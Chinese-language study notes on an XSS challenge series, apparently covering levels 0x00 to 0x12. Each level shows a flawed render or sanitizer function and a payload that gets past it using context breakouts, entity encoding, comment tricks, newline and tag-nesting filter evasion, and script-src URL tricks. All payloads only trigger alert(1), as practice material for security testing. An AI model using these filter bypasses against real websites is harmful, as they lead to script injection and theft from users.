
xss攻击
测试阶段都是以弹出alert(1)为准
标准语法
<script>alert(1)</script>


---------

0x00
function render (input) {
  return '<div>' + input + '</div>'
}

<script>alert(1)</script>

----------
0x01

</textarea> <script>alert(1)</script><textarea>

----------

0x02

function render (input) {
  return '<input type="name" value="' + input + '">'
}

<input type="name" value="  "><script>alert(1)</script><img    ">

-----------

0x03
function render (input) {
  //正则表达式
  const stripBracketsRe = /[   ()    ]/g
  input = input.replace(stripBracketsRe, '')
  return input
}

<script>alert`1`</script>

-------------

0x04
function render (input) {
  const stripBracketsRe = /[     ()`       ]/g
  input = input.replace(stripBracketsRe, '')
  return input
}

实体编码字符
<svg> 翻译官
把符号进行unicode转化

<svg><script>alert&#40;1&#41;</script>

------------
0x05

<!-- --> html的注释符
<!-- --!> 也可以当作注释符

--!> <script>alert(1)</script><!--

------------

0x06
function render (xxxxxx) {

  input = input.replace(/    auto|on.*=|>     /ig, '_')
  return `<input value=1 xxxxxxxxx type="text">`
}

正则表达式只抓一行的内容，但是html代码换行也可以执行
onmouseover
="alert(1)"

-------------
0x07

function render (input) {
  const stripTagsRe = /      <\/?[^>]+>      /gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}

所有标签，只让写左标签，右标签一加上，就没了
前端单标签可以只写左标签，不写右标签

<img src=x onerror="alert(1)"

---------------

0x08

function render (src) {
  src = src.replace(/    <\/style>    /ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}

前端的后标签可以换行书写，不影响效果

dfdfdfdfdfdfdfdf</style
><script>alert(1)</script>

-----------------

0x09

function render (input) {
  let domainRe = /     ^https?:\/\/www\.segmentfault\.com     /
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}

http://www.segmentfault.com" onload="alert(1) 
http://www.segmentfault.com"></script><img src=x onerror="alert(1)

<script src="http://www.segmentfault.com"></script><img src=x onerror="alert(1) "></script>

------------------
0x0A-C 出不来结果，现代的浏览器一般都不允许这种语法

http://www.segmentfault.com@http://127.0.0.1/abc.js

0x0B
所有输入内容都变为大写
windows不区分大小写，linux严格区分

http://www.segmentfault.com@http://127.0.0.1/ABC.JS

0x0C
<scriscriptpt src="http://127.0.0.1/ABC.JS"></scscriptript>

----------------
0x0d
function render (input) {
  input = input.replace(/[     </"'      ]/g, '')
  return `
    <script>
          // alert('xxxxxxxxx
          alert(1)
          -->')
    </script>
  `
}

xxxxxx
alert(1)
-->

-----------------

0x0e
function render (input) {
  input = input.replace(/      <([a-zA-Z])      /g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}

如果目标把我们所有的输入都大写了，肯定不能使用js语法（大小写敏感）

英文字母可以使用古英文代替

------------------
0x0f

<img src onerror="console.error('  ');alert(1)//  ')">

-----------------

0x10

<script>
  window.data = "haha";alert(1)

</script>

js赋值和php类似，如果两个语句不在一行，行尾加不加分号无所谓，如果一行，需要使用;间隔

---------------

0x11

<script>
  var url = 'javascript:console.log("xxxxx ");alert(1);//   ")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>

--------------

0x12

<script>console.log("fdfdfdfdfd\\ ");alert(1);// ");</script>

fdfdfdfdfd\");alert(1);//



